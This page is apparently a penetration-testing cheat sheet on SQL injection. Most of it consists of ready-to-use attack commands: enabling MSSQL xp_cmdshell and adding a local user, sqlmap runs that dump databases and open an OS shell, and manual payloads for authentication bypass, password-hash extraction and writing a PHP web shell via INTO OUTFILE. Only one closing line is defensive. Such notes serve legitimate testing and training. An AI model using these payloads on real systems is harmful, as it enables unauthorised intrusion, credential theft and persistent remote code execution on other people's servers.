---
layout: default
title: SQL Injection
parent: Web Applications
nav_order: 4
permalink: /webapps/sqli/
---

# SQL Injection
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Vulnerability

Most of web applications have a database attached to store data. To interaact with a database, the web application will use SQL or NoSQL languages in its backend. In some cases, it will write or modify data in the database based on inputs put in forms by end users. If these inputs are not correctly sanitized before being processed, you can take advantage of this by performing SQL Injection attack. It consists in injecting crafted SQL requests in the application to gain access to useful information in the database by using syntax tricks.

## Prerequisites

* Network access to the database, or...
* ...network access to a web application that interacts with a database.

## Exploit

If you gain an access to a MSSQL server, you can use the feature `xp_cmdshell` to execute system commands on the database’s server.

```bash
# Connect to the target database.
impacket-mssqlclient $username:$password@$target -windows-auth

# Enable advanced options.
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;

# Run xp_cmdshell that allow to run system commands.
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Execute whoami system command.
EXECUTE xp_cmdshell 'whoami';

# Add a local user.
EXECUTE xp_cmdshell 'net user $username $password /add'
```

SQL Injection can be automated with `sqlmap`.

```bash
# Run sqlmap with 'username' as parameter to test.
sqlmap -u http://$target/blindsqli.php?user=1 -p $username

# Dump the entire database.
sqlmap -u http://$target/blindsqli.php?user=1 -p $username --dump

# Open a full interactive shell.
sqlmap -u http://$target/blindsqli.php?user=1 -p $username --os-shell
```

You can also do it manually using payloads below.

```bash
# Blind SQLi
' AND 1=1 -- //
' AND IF (1=1, sleep(3),'false') -- //

# Bypass authentication
username' OR 1=1 -- //

# Get version
' or 1=1 in (select @@version) -- //

# Get users
' OR 1=1 in (SELECT * FROM users) -- //

# Get users' hashes
' or 1=1 in (SELECT password FROM users) -- //

# Get admin's password
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

# Discover number of colomns
' ORDER BY 1-- //

# Once you know the correct number of colomns, try to extract info
%' UNION SELECT database(), user(), @@version, null, null -- //
' UNION SELECT null, null, database(), user(), @@version  -- //
' UNION SELECT null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
' UNION SELECT null, username, password, description, null FROM users -- //

# Write <? system($_REQUEST['cmd']); ?> in /var/www/html/tmp/webshell.php
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

Here are some ways to connect to a database.

```bash
# Connect to a SQL database (Oracle, MariaDB, MSSQL, etc.)
mysql -u $username -p $password -h $target -P 3306

# Connect to MSSQL forcing NTLM authentication.
impacket-mssqlclient $username:$password@$target -windows-auth
```

Once connected, here are some useful commands.

```sql
# Get version
select version();
SELECT @@version; #MSSQL

# Get current running user
select system_user();

# Get databases
show databases;
SELECT name FROM sys.databases; #MSSQL

# Get a user
SELECT * FROM users WHERE user_name='username'

# Get database's tables
SELECT * FROM database.information_schema.tables;
```

Default databases.

| MSSQL  |
|--------|
| master |
| tempdb |
| model  |
| msdb   |

## Useful links

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) for more payloads.

## Recommendations

- [ ] Always check and sanitize users inputs in the web application's forms before process them in the database.